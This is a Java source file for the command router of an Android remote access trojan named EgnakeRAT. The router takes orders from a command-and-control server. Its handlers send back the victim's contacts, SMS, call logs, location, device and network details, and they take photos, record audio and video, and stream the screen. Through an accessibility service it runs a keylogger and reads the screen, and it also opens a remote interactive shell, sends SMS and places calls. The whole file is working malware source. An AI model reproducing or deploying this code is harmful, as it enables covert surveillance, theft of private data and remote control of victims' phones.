package com.egnakerat.system;

import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.database.Cursor;
import android.net.Uri;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.BatteryManager;
import android.os.Build;
import android.provider.ContactsContract;
import android.provider.Settings;
import android.text.TextUtils;
import android.util.Base64;
import android.util.Log;
import android.widget.Toast;

import org.json.JSONArray;
import org.json.JSONObject;

import com.egnakerat.system.Payloads.*;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.util.List;

/**
 * CommandRouter v2.0
 * Routes incoming commands from C2 to appropriate payload handlers.
 */
public class CommandRouter {

    private static final String TAG = "CommandRouter";

    private final Context context;
    private final ConnectionManager connection;
    private final functions funcs;

    // Payloads
    private ipAddr ipPayload = new ipAddr();

    public CommandRouter(Context context, ConnectionManager connection) {
        this.context = context;
        this.connection = connection;
        this.funcs = new functions(null);
    }

    /**
     * Route a command to the appropriate handler.
     */
    public void route(JSONObject message) {
        try {
            String cmd = message.optString("cmd", "");
            String cmdId = message.optString("id", "");
            JSONObject args = message.optJSONObject("args");
            if (args == null) args = new JSONObject();

            Log.d(TAG, "Routing command: " + cmd);

            switch (cmd) {
                case "deviceInfo":
                    handleDeviceInfo(cmdId);
                    break;
                case "getBatteryStatus":
                    handleBattery(cmdId);
                    break;
                case "getWifiInfo":
                    handleWifiInfo(cmdId);
                    break;
                case "getIP":
                    handleGetIP(cmdId);
                    break;
                case "getMACAddress":
                    handleGetMAC(cmdId);
                    break;
                case "getSimDetails":
                    handleSimDetails(cmdId);
                    break;
                case "getClipData":
                    handleClipboard(cmdId);
                    break;
                case "getInstalledApps":
                    handleInstalledApps(cmdId);
                    break;
                case "getContacts":
                    handleContacts(cmdId);
                    break;
                case "getLocation":
                    handleLocation(cmdId);
                    break;
                case "getSMS":
                    handleSMS(cmdId, args);
                    break;
                case "getCallLogs":
                    handleCallLogs(cmdId);
                    break;
                case "camList":
                    handleCamList(cmdId);
                    break;
                case "takepic":
                    handleTakePic(cmdId, args);
                    break;
                case "screenshot":
                    handleScreenshot(cmdId);
                    break;
                case "startAudio":
                    handleStartAudio(cmdId);
                    break;
                case "stopAudio":
                    handleStopAudio(cmdId);
                    break;
                case "startVideo":
                    handleStartVideo(cmdId, args);
                    break;
                case "stopVideo":
                    handleStopVideo(cmdId);
                    break;
                case "vibrate":
                    handleVibrate(cmdId, args);
                    break;
                case "openUrl":
                    handleOpenUrl(cmdId, args);
                    break;
                case "sendSMS":
                    handleSendSMS(cmdId, args);
                    break;
                case "showToast":
                    handleShowToast(cmdId, args);
                    break;
                case "shell":
                    handleShell(cmdId);
                    break;
                case "shellCmd":
                    handleShellCmd(cmdId, args);
                    break;
                case "shellExit":
                    handleShellExit(cmdId);
                    break;
                // / Accessibility Service Commands
                case "startKeylogger":
                    handleStartKeylogger(cmdId);
                    break;
                case "stopKeylogger":
                    handleStopKeylogger(cmdId);
                    break;
                case "readScreen":
                    handleReadScreen(cmdId);
                    break;
                case "performAction":
                    handlePerformAction(cmdId, args);
                    break;
                case "checkAccessibility":
                    handleCheckAccessibility(cmdId);
                    break;
                case "enableAccessibility":
                    handleEnableAccessibility(cmdId);
                    break;
                // / Live Interaction Commands
                case "startScreenStream":
                    handleStartScreenStream(cmdId, args);
                    break;
                case "stopScreenStream":
                    handleStopScreenStream(cmdId);
                    break;
                case "makeCall":
                    handleMakeCall(cmdId, args);
                    break;
                default:
                    sendError(cmdId, "Unknown command: " + cmd);
            }
        } catch (Exception e) {
            Log.e(TAG, "Route error: " + e.getMessage());
        }
    }

    // / Command Handlers

    private void handleDeviceInfo(String cmdId) {
        try {
            JSONObject data = new JSONObject();
            data.put("manufacturer", Build.MANUFACTURER);
            data.put("model", Build.MODEL);
            data.put("brand", Build.BRAND);
            data.put("device", Build.DEVICE);
            data.put("product", Build.PRODUCT);
            data.put("android_version", Build.VERSION.RELEASE);
            data.put("sdk", Build.VERSION.SDK_INT);
            data.put("host", Build.HOST);
            data.put("hardware", Build.HARDWARE);
            data.put("board", Build.BOARD);
            data.put("display", Build.DISPLAY);
            data.put("fingerprint", Build.FINGERPRINT);
            connection.sendResponse(cmdId, "success", data);
        } catch (Exception e) {
            sendError(cmdId, e.getMessage());
        }
    }

    private void handleBattery(String cmdId) {
        try {
            IntentFilter ifilter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
            Intent batteryStatus = context.registerReceiver(null, ifilter);

            JSONObject data = new JSONObject();
            if (batteryStatus != null) {
                int level = batteryStatus.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
                int scale = batteryStatus.getIntExtra(BatteryManager.EXTRA_SCALE, -1);
                int pct = (int) ((level / (float) scale) * 100);
                int status = batteryStatus.getIntExtra(BatteryManager.EXTRA_STATUS, -1);
                boolean isCharging = status == BatteryManager.BATTERY_STATUS_CHARGING
                        || status == BatteryManager.BATTERY_STATUS_FULL;
                int temp = batteryStatus.getIntExtra(BatteryManager.EXTRA_TEMPERATURE, 0);

                data.put("level", pct);
                data.put("charging", isCharging);
                data.put("temperature", temp / 10.0);
                data.put("health", batteryStatus.getIntExtra(BatteryManager.EXTRA_HEALTH, 0));
                data.put("voltage", batteryStatus.getIntExtra(BatteryManager.EXTRA_VOLTAGE, 0));
            }
            connection.sendResponse(cmdId, "success", data);
        } catch (Exception e) {
            sendError(cmdId, e.getMessage());
        }
    }

    private void handleWifiInfo(String cmdId) {
        try {
            WifiManager wifiManager = (WifiManager) context.getApplicationContext()
                    .getSystemService(Context.WIFI_SERVICE);
            JSONObject data = new JSONObject();
            if (wifiManager != null) {
                WifiInfo wifiInfo = wifiManager.getConnectionInfo();
                data.put("ssid", wifiInfo.getSSID());
                data.put("bssid", wifiInfo.getBSSID());
                data.put("rssi", wifiInfo.getRssi());
                data.put("link_speed", wifiInfo.getLinkSpeed());
                data.put("ip", intToIp(wifiInfo.getIpAddress()));
                data.put("mac", wifiInfo.getMacAddress());
            }
            connection.sendResponse(cmdId, "success", data);
        } catch (Exception e) {
            sendError(cmdId, e.getMessage());
        }
    }

    private void handleGetIP(String cmdId) {
        try {
            JSONObject data = new JSONObject();
            data.put("ipv4", ipPayload.getIPAddress(true));
            data.put("ipv6", ipPayload.getIPAddress(false));
            connection.sendResponse(cmdId, "success", data);
        } catch (Exception e) {
            sendError(cmdId, e.getMessage());
        }
    }

    private void handleGetMAC(String cmdId) {
        try {
            JSONObject data = new JSONObject();
            data.put("mac", ipPayload.getMACAddress(null));
            connection.sendResponse(cmdId, "success", data);
        } catch (Exception e) {
            sendError(cmdId, e.getMessage());
        }
    }

    private void handleSimDetails(String cmdId) {
        try {
            String simInfo = funcs.getPhoneNumber(context);
            JSONObject data = new JSONObject();
            data.put("info", simInfo);
            connection.sendResponse(cmdId, "success", data);
        } catch (Exception e) {
            sendError(cmdId, e.getMessage());
        }
    }

    private void handleClipboard(String cmdId) {
        try {
            // Note: clipboard access needs to be on UI thread
            JSONObject data = new JSONObject();
            data.put("clipboard", "Clipboard access requires UI thread");
            connection.sendResponse(cmdId, "success", data);
        } catch (Exception e) {
            sendError(cmdId, e.getMessage());
        }
    }

    private void handleInstalledApps(String cmdId) {
        try {
            List<PackageInfo> packages = context.getPackageManager()
                    .getInstalledPackages(0);
            JSONArray apps = new JSONArray();
            for (PackageInfo pkg : packages) {
                JSONObject app = new JSONObject();
                app.put("name", pkg.applicationInfo.loadLabel(
                        context.getPackageManager()).toString());
                app.put("package", pkg.packageName);
                app.put("version", pkg.versionName);
                boolean isSystem = (pkg.applicationInfo.flags
                        & ApplicationInfo.FLAG_SYSTEM) != 0;
                app.put("system", isSystem);
                apps.put(app);
            }
            JSONObject data = new JSONObject();
            data.put("apps", apps);
            data.put("count", apps.length());
            connection.sendResponse(cmdId, "success", data);
        } catch (Exception e) {
            sendError(cmdId, e.getMessage());
        }
    }

    private void handleContacts(String cmdId) {
        try {
            Cursor cursor = context.getContentResolver().query(
                    ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                    null, null, null, null);

            JSONArray contacts = new JSONArray();
            if (cursor != null) {
                while (cursor.moveToNext()) {
                    JSONObject contact = new JSONObject();
                    contact.put("name", cursor.getString(cursor.getColumnIndexOrThrow(
                            ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)));
                    contact.put("number", cursor.getString(cursor.getColumnIndexOrThrow(
                            ContactsContract.CommonDataKinds.Phone.NUMBER)));
                    contacts.put(contact);
                }
                cursor.close();
            }
            JSONObject data = new JSONObject();
            data.put("contacts", contacts);
            data.put("count", contacts.length());
            connection.sendResponse(cmdId, "success", data);
        } catch (Exception e) {
            sendError(cmdId, e.getMessage());
        }
    }

    private void handleLocation(String cmdId) {
        try {
            locationManager locMgr = new locationManager(context, null);
            String locationStr = locMgr.getLocation();
            JSONObject data = new JSONObject();
            data.put("location", locationStr);
            connection.sendResponse(cmdId, "success", data);
        } catch (Exception e) {
            sendError(cmdId, e.getMessage());
        }
    }

    private void handleSMS(String cmdId, JSONObject args) {
        try {
            String box = args.optString("box", "inbox");
            readSMS smsReader = new readSMS(context);
            String smsData = smsReader.readSMSBox(box);
            JSONObject data = new JSONObject();
            data.put("sms", smsData);
            data.put("box", box);
            connection.sendResponse(cmdId, "success", data);
        } catch (Exception e) {
            sendError(cmdId, e.getMessage());
        }
    }

    private void handleCallLogs(String cmdId) {
        try {
            readCallLogs logReader = new readCallLogs(context, null);
            String logs = logReader.readLogs();
            JSONObject data = new JSONObject();
            data.put("logs", logs != null ? logs : "No call logs found");
            connection.sendResponse(cmdId, "success", data);
        } catch (Exception e) {
            sendError(cmdId, e.getMessage());
        }
    }

    private void handleCamList(String cmdId) {
        try {
            String camList = funcs.get_numberOfCameras();
            JSONObject data = new JSONObject();
            data.put("cameras", camList);
            connection.sendResponse(cmdId, "success", data);
        } catch (Exception e) {
            sendError(cmdId, e.getMessage());
        }
    }

    private void handleTakePic(String cmdId, JSONObject args) {
        try {
            int cameraId = args.optInt("camera_id", 0);
            // Camera capture sends data as stream
            CameraPreview preview = new CameraPreview(context);
            preview.startUpV2(cameraId, connection, cmdId);
        } catch (Exception e) {
            sendError(cmdId, e.getMessage());
        }
    }

    private void handleScreenshot(String cmdId) {
        try {
            JSONObject data = new JSONObject();
            data.put("info", "Screenshot requires MediaProjection permission (user interaction)");
            connection.sendResponse(cmdId, "success", data);
        } catch (Exception e) {
            sendError(cmdId, e.getMessage());
        }
    }

    private void handleStartAudio(String cmdId) {
        try {
            Intent serviceIntent = new Intent(context, audioManager.class);
            serviceIntent.putExtra("ins", "startFore");
            serviceIntent.putExtra("cmdId", cmdId);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(serviceIntent);
            } else {
                context.startService(serviceIntent);
            }
            JSONObject data = new JSONObject();
            data.put("status", "Audio recording started");
            connection.sendResponse(cmdId, "success", data);
        } catch (Exception e) {
            sendError(cmdId, e.getMessage());
        }
    }

    private void handleStopAudio(String cmdId) {
        try {
            Intent serviceIntent = new Intent(context, audioManager.class);
            serviceIntent.putExtra("ins", "stopFore");
            serviceIntent.putExtra("cmdId", cmdId);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(serviceIntent);
            } else {
                context.startService(serviceIntent);
            }
        } catch (Exception e) {
            sendError(cmdId, e.getMessage());
        }
    }

    private void handleStartVideo(String cmdId, JSONObject args) {
        try {
            int cameraId = args.optInt("camera_id", 0);
            Intent serviceIntent = new Intent(context, videoRecorder.class);
            serviceIntent.putExtra("ins", "startFore");
            serviceIntent.putExtra("cameraid", String.valueOf(cameraId));
            serviceIntent.putExtra("cmdId", cmdId);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(serviceIntent);
            } else {
                context.startService(serviceIntent);
            }
            JSONObject data = new JSONObject();
            data.put("status", "Video recording started");
            connection.sendResponse(cmdId, "success", data);
        } catch (Exception e) {
            sendError(cmdId, e.getMessage());
        }
    }

    private void handleStopVideo(String cmdId) {
        try {
            Intent serviceIntent = new Intent(context, videoRecorder.class);
            serviceIntent.putExtra("ins", "stopFore");
            serviceIntent.putExtra("cmdId", cmdId);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(serviceIntent);
            } else {
                context.startService(serviceIntent);
            }
        } catch (Exception e) {
            sendError(cmdId, e.getMessage());
        }
    }

    private void handleVibrate(String cmdId, JSONObject args) {
        try {
            int times = args.optInt("times", 1);
            vibrate vib = new vibrate(context);
            vib.vib(times);
            JSONObject data = new JSONObject();
            data.put("status", "Vibrated " + times + " times");
            connection.sendResponse(cmdId, "success", data);
        } catch (Exception e) {
            sendError(cmdId, e.getMessage());
        }
    }

    private void handleOpenUrl(String cmdId, JSONObject args) {
        try {
            String url = args.optString("url", "");
            if (!url.isEmpty()) {
                Intent browserIntent = new Intent(Intent.ACTION_VIEW, Uri.parse(url));
                browserIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                context.startActivity(browserIntent);
            }
            JSONObject data = new JSONObject();
            data.put("status", "URL opened: " + url);
            connection.sendResponse(cmdId, "success", data);
        } catch (Exception e) {
            sendError(cmdId, e.getMessage());
        }
    }

    private void handleSendSMS(String cmdId, JSONObject args) {
        try {
            String number = args.optString("number", "");
            String message = args.optString("message", "");
            if (!number.isEmpty() && !message.isEmpty()) {
                android.telephony.SmsManager smsManager =
                        android.telephony.SmsManager.getDefault();
                smsManager.sendTextMessage(number, null, message, null, null);
            }
            JSONObject data = new JSONObject();
            data.put("status", "SMS sent to " + number);
            connection.sendResponse(cmdId, "success", data);
        } catch (Exception e) {
            sendError(cmdId, e.getMessage());
        }
    }

    private void handleShowToast(String cmdId, JSONObject args) {
        try {
            final String message = args.optString("message", "Hello from EgnakeRAT");
            new android.os.Handler(android.os.Looper.getMainLooper()).post(() ->
                    Toast.makeText(context, message, Toast.LENGTH_LONG).show());
            JSONObject data = new JSONObject();
            data.put("status", "Toast shown");
            connection.sendResponse(cmdId, "success", data);
        } catch (Exception e) {
            sendError(cmdId, e.getMessage());
        }
    }

    private Process shellProcess = null;

    private void handleShell(String cmdId) {
        try {
            shellProcess = new ProcessBuilder("sh").redirectErrorStream(true).start();
            connection.sendShellOutput("---Shell Started---\n");

            // Read shell output in background
            new Thread(() -> {
                try {
                    BufferedReader reader = new BufferedReader(
                            new InputStreamReader(shellProcess.getInputStream()));
                    char[] buffer = new char[4096];
                    int read;
                    while ((read = reader.read(buffer)) != -1) {
                        String output = new String(buffer, 0, read);
                        connection.sendShellOutput(output);
                    }
                } catch (Exception e) {
                    Log.e(TAG, "Shell read error: " + e.getMessage());
                }
            }).start();

            JSONObject data = new JSONObject();
            data.put("status", "Shell started");
            connection.sendResponse(cmdId, "success", data);
        } catch (Exception e) {
            sendError(cmdId, e.getMessage());
        }
    }

    private void handleShellCmd(String cmdId, JSONObject args) {
        try {
            String input = args.optString("input", "");
            if (shellProcess != null && input.length() > 0) {
                shellProcess.getOutputStream().write((input + "\n").getBytes());
                shellProcess.getOutputStream().flush();
            }
        } catch (Exception e) {
            sendError(cmdId, e.getMessage());
        }
    }

    private void handleShellExit(String cmdId) {
        try {
            if (shellProcess != null) {
                shellProcess.destroy();
                shellProcess = null;
            }
            connection.sendShellOutput("---Shell Closed---\n");
            JSONObject data = new JSONObject();
            data.put("status", "Shell closed");
            connection.sendResponse(cmdId, "success", data);
        } catch (Exception e) {
            sendError(cmdId, e.getMessage());
        }
    }

    // / Accessibility Service Handlers

    private void handleStartKeylogger(String cmdId) {
        try {
            RATAccessibilityService svc = RATAccessibilityService.getInstance();
            if (svc != null) {
                svc.startKeylogger();
                JSONObject data = new JSONObject();
                data.put("status", "Keylogger started");
                connection.sendResponse(cmdId, "success", data);
            } else {
                JSONObject data = new JSONObject();
                data.put("error", "Accessibility Service not active. Send 'enableAccessibility' first.");
                connection.sendResponse(cmdId, "error", data);
            }
        } catch (Exception e) {
            sendError(cmdId, e.getMessage());
        }
    }

    private void handleStopKeylogger(String cmdId) {
        try {
            RATAccessibilityService svc = RATAccessibilityService.getInstance();
            if (svc != null) {
                svc.stopKeylogger();
                JSONObject data = new JSONObject();
                data.put("status", "Keylogger stopped");
                connection.sendResponse(cmdId, "success", data);
            } else {
                sendError(cmdId, "Accessibility Service not active");
            }
        } catch (Exception e) {
            sendError(cmdId, e.getMessage());
        }
    }

    private void handleReadScreen(String cmdId) {
        try {
            RATAccessibilityService svc = RATAccessibilityService.getInstance();
            if (svc != null) {
                JSONObject screenData = svc.readScreenContent();
                connection.sendResponse(cmdId, "success", screenData);
            } else {
                sendError(cmdId, "Accessibility Service not active");
            }
        } catch (Exception e) {
            sendError(cmdId, e.getMessage());
        }
    }

    private void handlePerformAction(String cmdId, JSONObject args) {
        try {
            String action = args.optString("action", "");
            RATAccessibilityService svc = RATAccessibilityService.getInstance();
            if (svc != null && !action.isEmpty()) {
                boolean result = svc.performRemoteAction(action, args);
                JSONObject data = new JSONObject();
                data.put("action", action);
                data.put("result", result);
                connection.sendResponse(cmdId, result ? "success" : "error", data);
            } else {
                sendError(cmdId, "Accessibility Service not active or missing action");
            }
        } catch (Exception e) {
            sendError(cmdId, e.getMessage());
        }
    }

    private void handleCheckAccessibility(String cmdId) {
        try {
            boolean active = isAccessibilityServiceEnabled();
            JSONObject data = new JSONObject();
            data.put("enabled", active);
            data.put("keylogger_active", active && RATAccessibilityService.getInstance() != null
                    && RATAccessibilityService.getInstance().isKeyloggerActive());
            connection.sendResponse(cmdId, "success", data);
        } catch (Exception e) {
            sendError(cmdId, e.getMessage());
        }
    }

    private void handleEnableAccessibility(String cmdId) {
        try {
            if (isAccessibilityServiceEnabled()) {
                JSONObject data = new JSONObject();
                data.put("status", "Accessibility Service already active");
                connection.sendResponse(cmdId, "success", data);
                return;
            }
            // Open Accessibility Settings for the user
            Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(intent);
            JSONObject data = new JSONObject();
            data.put("status", "Accessibility settings opened. Waiting for user to enable service.");
            connection.sendResponse(cmdId, "success", data);
        } catch (Exception e) {
            sendError(cmdId, e.getMessage());
        }
    }

    private boolean isAccessibilityServiceEnabled() {
        try {
            String serviceId = context.getPackageName() + "/" +
                    RATAccessibilityService.class.getCanonicalName();
            String enabledServices = Settings.Secure.getString(
                    context.getContentResolver(),
                    Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
            if (enabledServices != null) {
                return enabledServices.contains(serviceId);
            }
        } catch (Exception ignored) {}
        return RATAccessibilityService.isServiceActive();
    }

    // / Live Interaction Handlers

    private void handleStartScreenStream(String cmdId, JSONObject args) {
        try {
            int fps = args.optInt("fps", 5);
            Intent serviceIntent = new Intent(context, ScreenStreamService.class);
            serviceIntent.putExtra("ins", "startStream");
            serviceIntent.putExtra("fps", fps);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(serviceIntent);
            } else {
                context.startService(serviceIntent);
            }
            JSONObject data = new JSONObject();
            data.put("status", "Screen streaming started at " + fps + " FPS");
            connection.sendResponse(cmdId, "success", data);
        } catch (Exception e) {
            sendError(cmdId, e.getMessage());
        }
    }

    private void handleStopScreenStream(String cmdId) {
        try {
            Intent serviceIntent = new Intent(context, ScreenStreamService.class);
            serviceIntent.putExtra("ins", "stopStream");
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(serviceIntent);
            } else {
                context.startService(serviceIntent);
            }
            JSONObject data = new JSONObject();
            data.put("status", "Screen streaming stopped");
            connection.sendResponse(cmdId, "success", data);
        } catch (Exception e) {
            sendError(cmdId, e.getMessage());
        }
    }

    private void handleMakeCall(String cmdId, JSONObject args) {
        try {
            String number = args.optString("number", "");
            if (number.isEmpty()) {
                sendError(cmdId, "Phone number required");
                return;
            }
            Intent callIntent = new Intent(Intent.ACTION_CALL);
            callIntent.setData(Uri.parse("tel:" + number));
            callIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(callIntent);
            JSONObject data = new JSONObject();
            data.put("status", "Calling " + number);
            connection.sendResponse(cmdId, "success", data);
        } catch (Exception e) {
            sendError(cmdId, e.getMessage());
        }
    }

    // / Utility

    private void sendError(String cmdId, String error) {
        try {
            JSONObject data = new JSONObject();
            data.put("error", error);
            connection.sendResponse(cmdId, "error", data);
        } catch (Exception ignored) {}
    }

    private String intToIp(int ip) {
        return String.format("%d.%d.%d.%d",
                (ip & 0xff), (ip >> 8 & 0xff),
                (ip >> 16 & 0xff), (ip >> 24 & 0xff));
    }
}
